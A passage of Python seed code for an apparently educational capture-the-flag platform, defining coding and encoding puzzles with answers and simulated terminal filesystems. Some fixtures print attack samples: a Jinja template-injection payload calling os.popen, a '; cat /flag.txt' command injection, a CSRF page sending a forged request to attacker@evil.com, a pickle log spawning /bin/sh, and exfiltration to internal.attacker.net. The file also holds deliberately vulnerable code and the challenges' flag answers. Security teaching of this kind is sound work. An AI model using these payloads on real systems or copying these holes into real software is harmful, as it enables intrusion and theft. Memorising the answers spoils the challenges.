        "hint": "A stack is the classic tool: push on every opener, pop-and-compare on every closer, and the string is only balanced if the stack ends up empty.",
        "answer": "a_stack_tracks_the_open_brackets",
        "rules": "Runs entirely in your browser - use the Run button in the editor panel to test your code, then Submit once every test passes.",
    },
    {
        "title": "Binary Search Index",
        "category": "coding",
        "type": "standard",
        "difficulty": "hard",
        "points": 200,
        "description": None,
        "hint": "The array is always sorted ascending. Halve the search space every step instead of scanning linearly, and return -1 if the target never turns up.",
        "answer": "halve_the_search_space_every_step",
        "rules": "Runs entirely in your browser - use the Run button in the editor panel to test your code, then Submit once every test passes.",
    },
    {
        "title": "Longest Increasing Run",
        "category": "coding",
        "type": "standard",
        "difficulty": "hard",
        "points": 250,
        "description": None,
        "hint": "Walk the array once, tracking the current run's length and resetting it to 1 whenever the next number isn't strictly greater than the one before it. Keep a running maximum as you go.",
        "answer": "one_pass_tracking_the_current_streak",
        "rules": "Runs entirely in your browser - use the Run button in the editor panel to test your code, then Submit once every test passes.",
    },
    {
        "title": "Ported From Python: Batch It Up",
        "category": "coding",
        "type": "standard",
        "difficulty": "medium",
        "points": 150,
        "description": None,
        "hint": "Walk the array in strides of `size`, slicing out one chunk per stride - Array.prototype.slice(i, i + size) in a loop does the whole job.",
        "answer": "slice_in_strides_of_size",
        "rules": "Runs entirely in your browser - use the Run button in the editor panel to test your code, then Submit once every test passes.",
    },
    {
        "title": "Ported From C: Fixed-Width Hex",
        "category": "coding",
        "type": "standard",
        "difficulty": "medium",
        "points": 150,
        "description": None,
        "hint": "n.toString(16) gets you the hex digits; String.prototype.padStart(width, \"0\") gets you the zero-padding. Combine them.",
        "answer": "tostring_16_then_padstart",
        "rules": "Runs entirely in your browser - use the Run button in the editor panel to test your code, then Submit once every test passes.",
    },
]


def _finalize_challenges():
    """Turn each "answer" into the real OCTF{<md5>} flag, and fill in the
    pieces of content (ciphertext, dropped files) that have to embed that
    exact flag for their challenge to actually be solvable."""
    for c in CHALLENGES:
        c["flag"] = flag_from_answer(c.pop("answer"))

    by_title = {c["title"]: c for c in CHALLENGES}

    caesar = by_title["Caesar's Problem"]
    cipher = codecs.encode(caesar["flag"], "rot13")
    caesar["description"] = (
        "Decode this Caesar cipher (shift of 13, i.e. ROT13):\n\n"
        f"    {cipher}\n\n"
        "Submit the decoded text as the flag, wrapped exactly as it decodes."
    )

    double_wrapped = by_title["Double Wrapped"]
    wrapped = base64.b64encode(double_wrapped["flag"].encode()).decode()[::-1]
    double_wrapped["description"] = (
        "This flag was base64-encoded, then the result was reversed. "
        "Undo both steps:\n\n"
        f"    {wrapped}\n\n"
        "(Reverse the whole string first, then base64-decode it.)"
    )

    encoding_onion = by_title["Encoding Onion"]
    onion_wrapped = base64.b64encode(
        base64.b64encode(encoding_onion["flag"].encode()).decode().encode()
    ).decode()
    encoding_onion["description"] = (
        "Someone wrapped a flag in layers of encoding before leaving it in a "
        "support ticket:\n\n"
        f"    {onion_wrapped}\n\n"
        "Peel it back one layer at a time. First it's Base64. What you get "
        "after that first decode is Base64 again. Keep decoding until you "
        "get back plain text, and submit that as the flag."
    )

    base_run = by_title["Base Run"]
    br_step1 = base64.b32encode(base_run["flag"].encode()).decode()
    br_step2 = base64.b64encode(br_step1.encode()).decode()
    br_step3 = br_step2.encode().hex()
    base_run["description"] = (
        "A flag was passed through three encodings in sequence: first "
        "Base32, then Base64, then hex. Here's the final, hex-encoded "
        "output:\n\n"
        f"    {br_step3}\n\n"
        "Work backward through hex -> Base64 -> Base32 to recover the flag, "
        "then submit it exactly as it decodes."
    )

    vigenere_veil = by_title["Vigenere Veil"]

    def _vigenere_encrypt(text, key):
        key = key.upper()
        out = []
        k = 0
        for ch in text:
            if ch.isalpha():
                base = 65 if ch.isupper() else 97
                shift = ord(key[k % len(key)]) - 65
                out.append(chr((ord(ch) - base + shift) % 26 + base))
                k += 1
            else:
                out.append(ch)
        return "".join(out)

    vigenere_cipher = _vigenere_encrypt(vigenere_veil["flag"], "KEY")
    vigenere_veil["description"] = (
        "A flag was encrypted with a Vigenere cipher using the repeating "
        "key `KEY` (letters only are shifted; digits, braces, and other "
        "characters are left as-is):\n\n"
        f"    {vigenere_cipher}\n\n"
        "Decrypt it back to the original flag and submit it exactly as it "
        "decodes."
    )

    xor_marks_the_spot = by_title["XOR Marks the Spot"]
    xor_key = 0x2A
    xor_hex = bytes(b ^ xor_key for b in xor_marks_the_spot["flag"].encode()).hex()
    xor_marks_the_spot["description"] = (
        "This hex string was produced by XOR-ing a flag against a single "
        "repeating byte key:\n\n"
        f"    {xor_hex}\n\n"
        "Try every byte 0x00-0xFF as the key and look for the output that's "
        "printable ASCII starting with 'OCTF{'. Submit the recovered flag "
        "exactly as it decodes."
    )

    poke_around = by_title["Poke Around"]
    poke_around["terminal_fs"] = {
        "home": {
            "user": {
                "notes.txt": "Reminder: rotate the API keys before Friday.",
                "todo.txt": "- fix printer\n- update docs\n- ask about the backup folder",
                "backup": {
                    ".old_notes.txt": "nothing here, just old meeting notes",
                    ".secret_flag.txt": poke_around["flag"],
                },
            }
        },
        "var": {
            "log": {
                "app.log": "2026-01-02 09:14 INFO server started\n2026-01-02 09:15 INFO listening on :8080",
            }
        },
    }

    grep_the_logs = by_title["Grep the Logs"]
    grep_the_logs["terminal_fs"] = {
        "var": {
            "log": {
                "auth.log": (
                    "Jan 2 03:14:01 sshd: Failed password for root from 10.0.0.5\n"
                    "Jan 2 03:14:03 sshd: Failed password for root from 10.0.0.5\n"
                    "Jan 2 03:14:09 sshd: Accepted password for root from 10.0.0.5\n"
                    "Jan 2 03:15:00 sudo: root ran: cat /etc/shadow"
                ),
                "syslog": "Jan 2 03:16:00 kernel: nothing unusual here",
                "mystery.log": f"you found it.\n{grep_the_logs['flag']}",
            }
        },
        "home": {
            "user": {"readme.txt": "ask the sysadmin if the server seems slow"}
        },
    }

    # ------------------------------------------------ GENERAL (terminal)
    permission_denied = by_title["Permission Denied"]
    permission_denied["terminal_fs"] = {
        "var": {
            "backups": {
                "2025-11-03": {
                    "db_dump.sql.bak": "-- routine dump, nothing interesting here --",
                    "README.txt": (
                        "Backup retention notes:\n"
                        "  - Most of these are auto-rotated and boring.\n"
                        "  - The one exception: 2025-12-14/incident_notes.txt\n"
                        "    was left -rw-rw---- on purpose so the on-call\n"
                        "    group could read it without root. Go look."
                    ),
                },
                "2025-12-01": {
                    "web_config.bak": "server_name: prod-web-01\nport: 8080",
                },
                "2025-12-14": {
                    "incident_notes.txt": (
                        "On-call handoff notes - mode -rw-rw---- (owner root, "
                        "group oncall, both can read+write, everyone else "
                        "locked out):\n\n"
                        f"{permission_denied['flag']}\n"
                    ),
                    "nginx_access.bak": "10.0.0.4 - - [14/Dec/2025] GET /health 200",
                },
            }
        }
    }

    key_to_the_kingdom = by_title["Key to the Kingdom"]
    key_to_the_kingdom["terminal_fs"] = {
        "home": {
            "deploy": {
                ".ssh": {
                    "id_rsa.pub": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7f4k... deploy@jumpbox",
                    "backup_key": (
                        "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA...\n"
                        "ENCRYPTED: Proc-Type: 4,ENCRYPTED\n"
                        "-----END OPENSSH PRIVATE KEY-----\n"
                    ),
                    "notes.txt": (
                        "backup_key needs a passphrase nobody remembers - useless.\n"
                        "old_key in this same folder was generated without one\n"
                        "before the passphrase policy existed. Don't tell security."
                    ),
                    "old_key": (
                        "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                        "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAA...\n"
                        f"# no passphrase - {key_to_the_kingdom['flag']}\n"
                        "-----END OPENSSH PRIVATE KEY-----\n"
                    ),
                }
            }
        }
    }

    grep_ninja = by_title["Grep Ninja"]
    grep_ninja["terminal_fs"] = {
        "var": {
            "log": {
                "nginx": {
                    "access.log": "\n".join(f"10.0.0.{i} - - GET /page{i} 200" for i in range(1, 12)),
                    "error.log": "2026-01-04 warn: upstream slow to respond",
                },
                "app": {
                    "worker-1.log": "INFO tick\nINFO tick\nINFO tick",
                    "worker-2.log": f"INFO tick\nINFO FLAG_DROP {grep_ninja['flag']}\nINFO tick",
                },
                "syslog": "Jan 4 00:00:01 kernel: nothing unusual",
            }
        }
    }

    one_liner = by_title["One-Liner"]
    incoming = {}
    for i in range(1, 9):
        incoming[f"report-{i:02d}.csv"] = "id,value\n1,42\n2,17" if i != 6 else (
            f"id,value,note\n1,42,confidential {one_liner['flag']}\n2,17,routine"
        )
    incoming["readme.txt"] = "Drop nightly reports here. Most are routine."
    incoming["notes-old.csv"] = "id,value\n1,1"  # doesn't match report-*.csv - decoy
    one_liner["terminal_fs"] = {"data": {"incoming": incoming}}

    # --------------------------------------------------------- WEB (terminal)
    template_trouble = by_title["Template Trouble"]
    template_trouble["terminal_fs"] = {
        "opt": {
            "app": {
                "app.py": (
                    "from flask import Flask, request, render_template_string\n"
                    "app = Flask(__name__)\n\n"
                    "@app.route('/greet')\n"
                    "def greet():\n"
                    "    name = request.args.get('name', 'guest')\n"
                    "    return render_template_string('Hello ' + name)\n"
                ),
                "access.log": (
                    "10.0.0.9 GET /greet?name=world 200\n"
                    "10.0.0.9 GET /greet?name=friend 200\n"
                    "10.0.0.13 GET /greet?name={{7*7}} 200\n"
                    "10.0.0.13 GET /greet?name={{self.__init__.__globals__['os'].popen('cat"
                    " /flag').read()}} 200\n"
                    f"10.0.0.13 RESPONSE_BODY: Hello {template_trouble['flag']}\n"
                ),
            }
        }
    }

    forged_request = by_title["Forged Request"]
    forged_request["terminal_fs"] = {
        "opt": {
            "bank-app": {
                "routes.py": (
                    "@app.route('/change-email')\n"
                    "def change_email():\n"
                    "    # no CSRF token check, relies on the session cookie alone\n"
                    "    new = request.args.get('new')\n"
                    "    current_user().email = new\n"
                    "    return 'ok'\n"
                ),
            },
            "evidence": {
                "attacker_site.html": (
                    "<html><body>\n"
                    "  <h1>Free gift cards!</h1>\n"
                    "  <img src=\"https://bank.example/change-email?new=attacker@evil.com\" "
                    "width=\"0\" height=\"0\">\n"
                    "</body></html>\n"
                ),
                "server.log": (
                    "10.0.0.20 GET /dashboard 200\n"
                    "10.0.0.20 GET /change-email?new=attacker@evil.com 200\n"
                    f"10.0.0.20 CONFIRMATION_CODE: {forged_request['flag']}\n"
                ),
            },
        }
    }

    ping_of_doom = by_title["Ping of Doom"]
    ping_of_doom["terminal_fs"] = {
        "opt": {
            "diagnostics": {
                "diag.py": (
                    "import os\n"
                    "@app.route('/ping')\n"
                    "def ping():\n"
                    "    host = request.args.get('host')\n"
                    "    return os.popen('ping -c 1 ' + host).read()  # no sanitization\n"
                ),
                "command_history.txt": (
                    "ping -c 1 10.0.0.1\n"
                    "ping -c 1 10.0.0.1; whoami\n"
                    "  -> www-data\n"
                    "ping -c 1 10.0.0.1; cat /flag.txt\n"
                    f"  -> {ping_of_doom['flag']}\n"
                ),
            }
        }
    }

    pickled_trouble = by_title["Pickled Trouble"]
    pickled_trouble["terminal_fs"] = {
        "opt": {
            "session-app": {
                "session_handler.py": (
                    "import pickle, base64\n"
                    "def load_session(cookie):\n"
                    "    # no signature check - whatever pickle produces, we trust\n"
                    "    return pickle.loads(base64.b64decode(cookie))\n"
                ),
                "debug.log": (
                    "session cookie decoded ok\n"
                    "session cookie decoded ok\n"
                    "calling __reduce__ on decoded object...\n"
                    "subprocess spawned: /bin/sh -c 'cat /flag'\n"
                    f"subprocess output: {pickled_trouble['flag']}\n"
                ),
            }
        }
    }

    # --------------------------------------------------- FORENSICS (terminal)
    packet_peeker = by_title["Packet Peeker"]
    packet_peeker["terminal_fs"] = {
        "forensics": {
            "capture": {
                "traffic_summary.txt": (
                    "GET /index.html 200 10.0.0.4\n"
                    "GET /style.css 200 10.0.0.4\n"
                    "GET /favicon.ico 404 10.0.0.4\n"
                    "POST /upload HTTP/1.1 10.0.0.4 -> internal.attacker.net "
                    f"Content: filename=notes.txt; flag={packet_peeker['flag']}\n"
                    "GET /about.html 200 10.0.0.5\n"
                ),
            }
        }
    }

    memory_lane = by_title["Memory Lane"]
    memory_lane["terminal_fs"] = {
        "forensics": {
            "memory": {
                "pslist_output.txt": (
                    "PID   PPID  NAME              CMDLINE\n"
                    "1     0     systemd           /sbin/init\n"
                    "412   1     sshd              /usr/sbin/sshd -D\n"
                    "889   412   bash              -bash\n"
                    "1337  889   creds_stealer     "
                    f"./creds_stealer --exfil-key {memory_lane['flag']}\n"
                    "1500  1     cron              /usr/sbin/cron\n"
                ),
            }
        }
    }

    pixel_secrets = by_title["Pixel Secrets"]
    pixel_secrets["terminal_fs"] = {
        "forensics": {
            "images": {
                "photo.png": (
                    "\x89PNG\r\n\x1a\n" + "\x00\x01\x02\x03IHDR\x00\x00\x02\x00" +
                    "\x00\x00\x01\x80\x08\x06\x00\x00\x00" +
                    f"LSB_PAYLOAD:{pixel_secrets['flag']}" +
                    "\x00\x00IEND\xae\x42\x60\x82"
                ),
            }
        }
    }

    exif_exposed = by_title["EXIF Exposed"]
    exif_exposed["terminal_fs"] = {
        "forensics": {
            "exif": {
                "photo_metadata.txt": (
                    "Camera Model: PixelCam X200\n"
                    "GPS Latitude: 37.7749 N\n"
                    "GPS Longitude: 122.4194 W\n"
                    "Date/Time Original: 2025:11:02 14:03:11\n"
                    f"Comment: {exif_exposed['flag']}\n"
                ),
            }
        }
    }

    # ------------------------------------------------- REVERSE (terminal)
    strings_attached = by_title["Strings Attached"]
    strings_attached["terminal_fs"] = {
        "reverse": {
            "mystery_binary": (
                "\x7fELF\x02\x01\x01\x00" + "\x00" * 8 +
                "\x02\x00\x3e\x00\x01\x00\x00\x00" + "\x89garbage\x01\x02\x03" +
                f"{strings_attached['flag']}" + "\x00\x00more_binary_noise\x00\x00"
            ),
        }
    }

    upx_unwrapped = by_title["UPX Unwrapped"]
    upx_unwrapped["terminal_fs"] = {
        "reverse": {
            "packed": {
                "app.packed": (
                    "\x7fELF\x02\x01\x01\x00" + "UPX!" + "\x00\x01\x02\x03" * 4
                ),
            },
            "build-cache": {
                "2025-10-01": {
                    "app.original": (
                        "\x7fELF\x02\x01\x01\x00" + "\x00" * 4 +
                        f"license_check_passed:{upx_unwrapped['flag']}"
                    ),
                }
            },
        }
    }

    anti_debug_101 = by_title["Anti-Debug 101"]
    anti_debug_101["terminal_fs"] = {
        "reverse": {
            "trace": {
                "strace_output.txt": (
                    "execve(\"./crackme\", [\"./crackme\"], 0x7ffde...) = 0\n"
                    "brk(NULL) = 0x55a1000\n"
                    "ptrace(PTRACE_TRACEME, 0, NULL, NULL) = -1 EPERM (Operation not permitted)\n"
                    f"write(2, \"debugger detected: {anti_debug_101['flag']}\\n\", 48)\n"
                    "exit_group(1) = ?\n"
                ),
            }
        }
    }

    disassembly_basics = by_title["Disassembly Basics"]
    disassembly_basics["terminal_fs"] = {
        "reverse": {
            "license": {
                "license_check.asm": (
                    "; simplified disassembly of check_license()\n"
                    "mov eax, [license_input]\n"
                    "cmp eax, 0x2A          ; compare against expected value\n"
                    "jne fail_label\n"
                    "jmp branches/branch_0x2a.txt  ; (pseudo - see branches/ for real output)\n"
                    "fail_label:\n"
                    "jmp branches/branch_fail.txt\n"
                ),
                "branches": {
                    "branch_0x29.txt": "License check failed (tried 0x29 / 41). Try again.",
                    "branch_0x2a.txt": f"License check PASSED (0x2A / 42). {disassembly_basics['flag']}",
                    "branch_0x2b.txt": "License check failed (tried 0x2B / 43). Try again.",
                    "branch_fail.txt": "License check failed. Invalid key.",
                },
            }
        }
    }

    # -------------------------------------------------- BINARY (terminal)
    stack_smash_101 = by_title["Stack Smash 101"]
    stack_smash_101["terminal_fs"] = {
        "binary": {
            "stack": {
                "vuln.c": (
                    "void vuln() {\n"
                    "    char buf[64];\n"
                    "    gets(buf);   // no bounds check - classic overflow\n"
                    "    process(buf);\n"
                    "}\n"
                ),
                "debug_build": {
                    ".artifacts": {
                        "backdoor_output.txt": (
                            f"[DEBUG BUILD ONLY] overflow reached return address: {stack_smash_101['flag']}\n"
                        ),
                    }
                },
            }
        }
    }

    format_string_fumble = by_title["Format String Fumble"]
    format_string_fumble["terminal_fs"] = {
        "binary": {
            "fmtstr": {
                "format_bug.c": (
                    "void log_input(char *user_input) {\n"
                    "    printf(user_input);   // should be printf(\"%s\", user_input)\n"
                    "}\n"
                ),
                "crash_dump.hex": (
                    "7ffd1a2b3c40: 41414141 42424242 43434343\n"
                    "7ffd1a2b3c4c: " +
                    " ".join(hex(b)[2:].zfill(2) for b in format_string_fumble["flag"].encode()) +
                    "\n7ffd1a2b3c60: 00000000 deadbeef cafebabe\n"
                    f"; readable run recovered: {format_string_fumble['flag']}\n"
                ),
            }
        }
    }

    heap_of_trouble = by_title["Heap of Trouble"]
    heap_of_trouble["terminal_fs"] = {
        "binary": {
            "heap": {
                "heap_bug.c": (
                    "Session *s = get_session(id);\n"
                    "free(s);\n"
                    "...\n"
                    "s->last_action();   // use-after-free - s was already freed above\n"
                ),
                "heap_dump.raw": (
                    "\x00\x00\x18\x00\x00\x00\x00\x00" + "chunk_header_0x18" +
                    f"freed_chunk_still_resident:{heap_of_trouble['flag']}" +
                    "\x00\x00" + "next_chunk_metadata" + "\x00\x00"
                ),
            }
        }
    }

    chain_reaction = by_title["Chain Reaction"]
    gadget_lines = [
        "0x0000000000401234: pop rdi ; ret",
        "0x0000000000401238: pop rsi ; pop r15 ; ret",
        "0x000000000040123f: mov eax, edi ; ret",
        "0x0000000000401245: pop rdi ; ret",
        f"0x0000000000401250: pop rdi ; ret  ; # FLAG {chain_reaction['flag']}",
        "0x0000000000401260: pop rdx ; ret",
        "0x0000000000401270: syscall ; ret",
    ]
    chain_reaction["terminal_fs"] = {
        "binary": {"rop": {"gadgets.txt": "\n".join(gadget_lines)}}
    }

    # ---------------------------------------------- BLOCKCHAIN (terminal)
    reentrancy_rumble = by_title["Reentrancy Rumble"]
    reentrancy_rumble["terminal_fs"] = {
        "blockchain": {
            "reentrancy": {
                "Vault.sol": (
                    "function withdraw(uint amount) public {\n"
                    "    require(balances[msg.sender] >= amount);\n"
                    "    (bool ok, ) = msg.sender.call{value: amount}(\"\");  // external call first\n"
                    "    require(ok);\n"
                    "    balances[msg.sender] -= amount;   // state updated AFTER the call - bug\n"
                    "}\n"
                ),
                "exploit_trace.log": (
                    "tx 0x1: Attacker.withdraw(1 ETH)\n"
                    "  -> Vault.withdraw() calls Attacker.fallback()\n"
                    "     -> Attacker.fallback() calls Vault.withdraw() again (balance not yet zeroed)\n"
                    "     -> ... repeats 40x before balances[] is ever updated\n"
                    "post-mortem: classic reentrancy, vault drained.\n"
                    f"auditor note: {reentrancy_rumble['flag']}\n"
                ),
            }
        }
    }

    integer_overflow_inc = by_title["Integer Overflow Inc."]
    integer_overflow_inc["terminal_fs"] = {
        "blockchain": {
            "overflow": {
                "Token.sol": (
                    "pragma solidity ^0.7.6;   // pre-0.8, no built-in checked arithmetic\n"
                    "function transfer(address to, uint amount) public {\n"
                    "    balances[msg.sender] -= amount;   // no require(amount <= balance)\n"
                    "    balances[to] += amount;\n"
                    "}\n"
                ),
                "audit_report.txt": (
                    "Finding: unchecked subtraction on balances[msg.sender] allows an "
                    "account with a balance of 0 to call transfer() and underflow to "
                    "roughly 2^256-1 tokens.\n"
                    f"Reference: {integer_overflow_inc['flag']}\n"
                ),
            }
        }
    }

    tx_origin_trap = by_title["tx.origin Trap"]
    tx_origin_trap["terminal_fs"] = {
        "blockchain": {
            "txorigin": {
                "Wallet.sol": (
                    "function transfer(address payable to, uint amount) public {\n"
                    "    require(tx.origin == owner);   // should be msg.sender\n"
                    "    to.transfer(amount);\n"
                    "}\n"
                ),
                "incident_report.txt": (
                    "Owner visited a malicious site while their wallet session was "
                    "active. The site's contract called Wallet.transfer() on the "
                    "owner's behalf - tx.origin still resolved to the owner's EOA, "
                    "so the check passed even though msg.sender was the attacker's "
                    "contract.\n"
                    f"Reference: {tx_origin_trap['flag']}\n"
                ),
            }
        }
    }

    front_run_fiasco = by_title["Front-Run Fiasco"]
    front_run_fiasco["terminal_fs"] = {
        "blockchain": {
            "frontrun": {
                "DEX.sol": (
                    "function swap(uint amountIn, uint minOut) public {\n"
                    "    // trades execute in whatever order they're mined\n"
                    "    ...\n"
                    "}\n"
                ),
                "mempool_log.txt": (
                    "12:00:01.100  tx 0xaaa (victim) swap(100, 95)   gas=20 gwei   PENDING\n"
                    "12:00:01.400  tx 0xbbb (bot)    swap(100, 95)   gas=200 gwei  PENDING\n"
                    "12:00:02.000  BLOCK #18234182 mined\n"
                    "  -> tx 0xbbb included first (higher gas)\n"
                    "  -> tx 0xaaa included second, worse price\n"
                    f"MEV researcher note: {front_run_fiasco['flag']}\n"
                ),
            }
        }
    }

    # -------------------------------------------------- FORENSICS (terminal)
    john_the_ripper_101 = by_title["John the Ripper 101"]
    # The hash is of the flag itself (same trick as Stack Smash 101's
    # backdoor_output.txt) - `john` cracks it against the wordlist below,
    # which has the flag planted among common leaked passwords, and prints
    # it straight back out.
    leaked_hash = hashlib.md5(john_the_ripper_101["flag"].encode()).hexdigest()
    john_the_ripper_101["terminal_fs"] = {
        "forensics": {
            "leak": {
                "README.txt": (
                    "Incident report: a misconfigured nightly backup job "
                    "briefly exposed one row of the users table before "
                    "being taken offline. Only a username and a password "
                    "hash were recovered - no salt, no pepper, just a bare "
                    "hash. Hand it to a cracker against a wordlist of "
                    "known-leaked passwords.\n"
                ),
                "leaked_hashes.txt": f"admin:{leaked_hash}\n",
                "rockyou_mini.txt": (
                    "123456\n"
                    "password\n"
                    "qwerty\n"
                    "letmein\n"
                    "dragon\n"
                    f"{john_the_ripper_101['flag']}\n"
                    "iloveyou\n"
                    "admin123\n"
                    "sunshine\n"
                ),
            }
        }
    }

    # ---------------------------------------------------- NETWORK (terminal)
    nmap_know_how = by_title["Nmap Know-How"]
    nmap_know_how["terminal_fs"] = {
        "network": {
            "zone_files": {
                "internal.zone": (
                    "; internal subnet - not for external resolution\n"
                    "router.internal.       IN  A   10.42.0.1\n"
                    "admin-panel.internal.  IN  A   10.42.0.17\n"
                    "backup.internal.       IN  A   10.42.0.23\n"
                ),
            },
            "scans": {
                "10.42.0.1.nmap": (
                    "53/tcp open  domain  dnsmasq 2.85\n"
                    "80/tcp open  http    lighttpd 1.4.63\n"
                ),
                "10.42.0.23.nmap": (
                    "22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu\n"
                ),
                "10.42.0.17.nmap": (
                    "21/tcp   open  ftp        vsftpd 3.0.3\n"
                    "22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu\n"
                    f"9443/tcp open  https-alt  Werkzeug httpd 2.2.3 (admin panel banner: {nmap_know_how['flag']})\n"
                ),
            },
        }
    }

    # ---------------------------------------------------------- CODING
    # Wires each CODING challenge's real flag into a [[coding-task]]
    # block (see server/addons/code-challenge/AUTHORING.md) and builds
    # its player-facing description around it.
    def _coding_description(intro, task):
        signatures = {
            "sumArray": (["nums"], ["int[]"], "int"),
            "isPalindrome": (["str"], ["string"], "bool"),
            "countFizzBuzz": (["n"], ["int"], "int"),
            "areAnagrams": (["a", "b"], ["string", "string"], "bool"),
            "isBalanced": (["str"], ["string"], "bool"),
            "binarySearchIndex": (["sortedArr", "target"], ["int[]", "int"], "int"),
            "longestIncreasingRun": (["nums"], ["int[]"], "int"),
            "chunkArray": (["nums", "size"], ["int[]", "int"], "int[][]"),
            "toFixedHex": (["n", "width"], ["int", "int"], "string"),
        }
        if task.get("function_name") in signatures:
            names, parameter_types, return_type = signatures[task["function_name"]]
            task["parameter_names"] = names
            task["parameter_types"] = parameter_types
            task["return_type"] = return_type
            task["languages"] = ["javascript", "python", "php", "ruby", "c", "cpp", "java"]
            if return_type == "int[][]":
                task["languages"].remove("c")
        block = json.dumps(task, indent=2)
        return f"{intro}\n\n[[coding-task]]\n{block}\n[[/coding-task]]"

    array_summation = by_title["Array Summation"]
    array_summation["description"] = _coding_description(
        "Warm up with a one-pass sum. Use the editor below to write and "
        "test your solution in JavaScript, Python, PHP, or Ruby.",
        {
            "function_name": "sumArray",
            "language": "javascript",
            "languages": ["javascript", "python", "php", "ruby", "c", "cpp", "java"],
            "starter_code": "function sumArray(nums) {\n  // return the sum of every number in nums\n}\n",
            "starter_code_by_language": {
                "python": "def sumArray(nums):\n    # return the sum of every number in nums\n    pass\n",
                "php": "function sumArray($nums) {\n    // implement the sum\n}\n",
                "ruby": "def sumArray(nums)\n  # implement the sum\nend\n",
            },
            "instructions": "Return the sum of all numbers in nums. An empty array sums to 0.",
            "tests": [
                {"args": [[1, 2, 3]], "expect": 6},
                {"args": [[]], "expect": 0},
                {"args": [[-5, 5, 10]], "expect": 10},
                {"args": [[100]], "expect": 100},
                {"args": [[2, 2, 2, 2]], "expect": 8},
            ],
            "flag": array_summation["flag"],
        },
    )

    palindrome_check = by_title["Palindrome Check"]
    palindrome_check["description"] = _coding_description(
        "Write a function that checks whether a string reads the same "
        "forwards and backwards.",
        {
            "function_name": "isPalindrome",
            "language": "javascript",
            "starter_code": "function isPalindrome(str) {\n  // return true if str reads the same forwards and backwards\n}\n",
            "instructions": "Every test string is already lowercase with no spaces or punctuation.",
            "tests": [
                {"args": ["racecar"], "expect": True},
                {"args": ["hello"], "expect": False},
                {"args": [""], "expect": True},
                {"args": ["a"], "expect": True},
                {"args": ["abccba"], "expect": True},
                {"args": ["abcde"], "expect": False},
            ],
            "flag": palindrome_check["flag"],
        },
    )

    fizzbuzz_counter = by_title["FizzBuzz Counter"]
    fizzbuzz_counter["description"] = _coding_description(
        "A twist on the classic: instead of printing Fizz/Buzz, count how "
        "many numbers trigger one.",
        {
            "function_name": "countFizzBuzz",
            "language": "javascript",
            "starter_code": "function countFizzBuzz(n) {\n  // count integers from 1 to n (inclusive) divisible by 3 or 5\n}\n",
            "instructions": "Count integers in [1, n] divisible by 3 or 5 - a multiple of both (like 15) still only counts once.",
            "tests": [
                {"args": [15], "expect": 7},
                {"args": [1], "expect": 0},
                {"args": [5], "expect": 2},
                {"args": [30], "expect": 14},
                {"args": [0], "expect": 0},
            ],
            "flag": fizzbuzz_counter["flag"],
        },
    )

    anagram_match = by_title["Anagram Match"]
    anagram_match["description"] = _coding_description(
        "Determine whether two strings are anagrams of each other - the "
        "same letters, just rearranged.",
        {
            "function_name": "areAnagrams",
            "language": "javascript",
            "starter_code": "function areAnagrams(a, b) {\n  // return true if a and b are anagrams of each other\n}\n",
            "instructions": "Every test string is already lowercase with no spaces.",
            "tests": [
                {"args": ["listen", "silent"], "expect": True},
                {"args": ["dormitory", "dirtyroom"], "expect": True},
                {"args": ["hello", "world"], "expect": False},
                {"args": ["", ""], "expect": True},
                {"args": ["abc", "abcd"], "expect": False},
            ],
            "flag": anagram_match["flag"],
        },
    )

    balanced_brackets = by_title["Balanced Brackets"]
    balanced_brackets["description"] = _coding_description(
        "Check whether every (), [], and {} in a string is properly "
        "matched and nested.",
        {
            "function_name": "isBalanced",
            "language": "javascript",
            "starter_code": "function isBalanced(str) {\n  // return true if every (), [], and {} in str is properly matched and nested\n}\n",
            "instructions": "str contains only the characters ( ) [ ] { } - no letters or digits to worry about.",
            "tests": [
                {"args": ["()[]{}"], "expect": True},
                {"args": ["(]"], "expect": False},
                {"args": ["([{}])"], "expect": True},
                {"args": ["(("], "expect": False},
                {"args": [""], "expect": True},
                {"args": ["{[()()]}"], "expect": True},
            ],
            "flag": balanced_brackets["flag"],
        },
    )

    binary_search_index = by_title["Binary Search Index"]
    binary_search_index["description"] = _coding_description(
        "Find a value's index in a sorted array without scanning it one "
        "element at a time.",
        {
            "function_name": "binarySearchIndex",
            "language": "javascript",
            "starter_code": "function binarySearchIndex(sortedArr, target) {\n  // return the index of target in sortedArr (ascending order), or -1 if it's not present\n}\n",
            "instructions": "sortedArr is always sorted ascending. A linear scan will pass the sample tests but isn't the point - halve the search space each step.",
            "tests": [
                {"args": [[1, 3, 5, 7, 9, 11], 7], "expect": 3},
                {"args": [[1, 3, 5, 7, 9, 11], 1], "expect": 0},
                {"args": [[1, 3, 5, 7, 9, 11], 11], "expect": 5},
                {"args": [[1, 3, 5, 7, 9, 11], 4], "expect": -1},
                {"args": [[], 5], "expect": -1},
            ],
            "flag": binary_search_index["flag"],
        },
    )

    longest_increasing_run = by_title["Longest Increasing Run"]
    longest_increasing_run["description"] = _coding_description(
        "Find the length of the longest run of strictly increasing, "
        "consecutive numbers in an array.",
        {
            "function_name": "longestIncreasingRun",
            "language": "javascript",
            "starter_code": "function longestIncreasingRun(nums) {\n  // return the length of the longest run of strictly increasing consecutive numbers\n}\n",
            "instructions": "\"Consecutive\" means adjacent in the array, not adjacent in value - e.g. [1,2,3,2,3,4,5,1] has a longest run of 4 ([2,3,4,5]).",
            "tests": [
                {"args": [[1, 2, 3, 2, 3, 4, 5, 1]], "expect": 4},
                {"args": [[5, 4, 3, 2, 1]], "expect": 1},
                {"args": [[1, 2, 3, 4, 5]], "expect": 5},
                {"args": [[]], "expect": 0},
                {"args": [[7]], "expect": 1},
            ],
            "flag": longest_increasing_run["flag"],
        },
    )

    # These porting challenges are also executable in their original
    # languages now that each task declares a typed function signature.
    batch_it_up = by_title["Ported From Python: Batch It Up"]
    batch_it_up["description"] = _coding_description(
        "The data pipeline used to lean on a one-line Python trick "
        "(something like [nums[i:i+size] for i in range(0, len(nums), size)]) "
        "to split a list into fixed-size batches before a rewrite dropped "
        "it. Recreate that behavior.",
        {
            "function_name": "chunkArray",
            "language": "javascript",
